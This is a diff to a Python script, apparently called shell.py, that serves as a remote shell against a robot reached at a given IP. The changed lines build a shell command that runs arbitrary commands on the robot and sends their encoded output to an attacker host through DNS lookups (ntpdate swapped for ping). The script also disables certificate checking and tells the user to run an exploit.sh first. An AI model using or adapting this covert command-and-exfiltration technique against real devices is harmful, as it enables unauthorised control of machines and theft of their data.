@@ -12,7 +12,7 @@ import socket
 robot_url = ""
 robot_ip = ""
 
-# Hack to disable cert validation because the robot has a self-signed cert
+# Disable cert validation because the robot has a self-signed cert
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
@@ -28,7 +28,7 @@ def run_command_raw(cmd):
 		
 # Run a command and get the output via DNS, then return it
 def run_command(cmd):
-	cmd = "for line in $(" + cmd + " 2>&1 | ksh /tmp/encode.ksh);do eval 'ntpdate -q -t 0.2 $line&';done"
+	cmd = "for line in $(" + cmd + " 2>&1 | ksh /tmp/encode.ksh);do eval 'ping -c 1 $line&';done"
 	run_command_raw(cmd)
 	return receive_output()
 
@@ -90,7 +90,7 @@ def receive_output():
 		s += linesDict[lineKey]	
 	return decode(s)
 		
-# Decode a string encoded with "encode.sh"
+# Decode a string encoded with "encode.ksh"
 def decode(s):
 	for i in range(0, len(string.printable)):
 		c = string.printable[i]
@@ -140,7 +140,7 @@ def create_resolv_conf(nameserver):
 if __name__ == "__main__":
 	if len(sys.argv) < 3:
 		print("Usage: shell.py <robot_ip> <attacker_ip>")
-		print("Note: before using this script, you need to send the exploit payload and reboot the robot, as described in README.md")
+		print("Note: run exploit.sh before using this script.")
 		exit(0)
 		
 	local_ip = sys.argv[2]
